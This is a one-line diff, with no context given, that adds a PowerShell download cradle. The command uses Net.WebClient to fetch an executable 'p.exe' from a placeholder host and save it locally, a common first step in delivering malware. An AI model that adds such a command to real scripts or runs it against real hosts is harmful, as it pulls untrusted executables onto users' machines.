@@ -1,0 +1,1 @@
+$c=New-Object Net.WebClient; $c.DownloadFile('http://df4-example.test/p.exe','p.exe')
